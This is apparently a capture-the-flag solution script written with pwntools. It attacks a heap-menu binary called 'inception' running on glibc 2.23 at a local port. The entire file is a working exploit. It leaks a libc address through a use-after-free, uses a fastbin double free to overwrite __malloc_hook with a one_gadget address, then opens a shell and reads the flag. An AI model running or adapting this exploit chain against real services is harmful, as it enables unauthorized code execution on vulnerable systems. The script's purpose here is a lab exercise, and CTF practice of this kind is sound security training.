from pwn import *
import warnings 
warnings.filterwarnings("ignore", category = BytesWarning)

#context.log_level = 'debug'
context.arch = 'amd64'

l = ELF('../chal/share/libc-2.23.so')
#r = process('../chal/share/inception')
r = remote('127.0.0.1', 50003)

def add(layer, text):
    r.sendlineafter('>', '1')
    r.sendlineafter('>', str(layer))
    r.sendlineafter(':', text)
   
def show(id):
    r.sendlineafter('>', '2')
    r.sendlineafter('>', str(id))

def delete(id):
    r.sendlineafter('>', '3')
    r.sendlineafter('>', str(id))

add(3, 'leak')
add(2, 'a')
add(2, 'a')
delete(1)
show(1)
r.recvline()

l.address = u64(r.recv(6) + b'\0\0') - 0x3c4b78
success('libc -> %s' % hex(l.address))

delete(2)
delete(3)
delete(2)

add(2, p64(l.sym.__malloc_hook - 0x23))
add(2, 'a')
add(2, 'a')

one_gadget = 0xf03a4 
add(2, b'a'*0x13 + p64(l.address + one_gadget))

delete(2)
delete(2)

#r.recvline()
sleep(0.1)
r.sendline('cat flag')
r.interactive()
